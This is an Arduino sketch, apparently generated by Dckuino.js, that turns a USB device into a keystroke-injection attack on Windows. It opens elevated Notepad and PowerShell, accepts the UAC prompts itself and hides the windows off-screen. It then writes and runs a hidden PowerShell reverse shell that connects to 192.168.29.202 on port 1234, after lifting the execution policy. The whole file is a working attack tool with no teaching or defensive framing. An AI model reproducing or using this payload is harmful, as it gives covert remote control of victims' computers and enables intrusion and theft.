void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

}/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(750);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell Start-Process notepad -Verb runAs");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(750);

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("m");

  delay(1000);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("Add-Content \"$env:TEMP\\29695.ps1\" '$c = New-Object System.Net.Sockets.TCPClient(\"192.168.29.202\",1234);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'");

  typeKey(KEY_RETURN);

  Keyboard.print("start-Process powershell.exe -windowstyle hidden \"$env:TEMP\\29695.ps1\"");

  typeKey(KEY_RETURN);

  Keyboard.print("Remove-Item $MyINvocation.InvocationName");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("C:\\Windows\\config-29695.ps1");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(750);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(750);

  Keyboard.print("powershell Start-Process cmd -Verb runAs");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("mode con:cols=14 lines=1");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(750);

  Keyboard.print("m");

  delay(750);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-29695.ps1");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
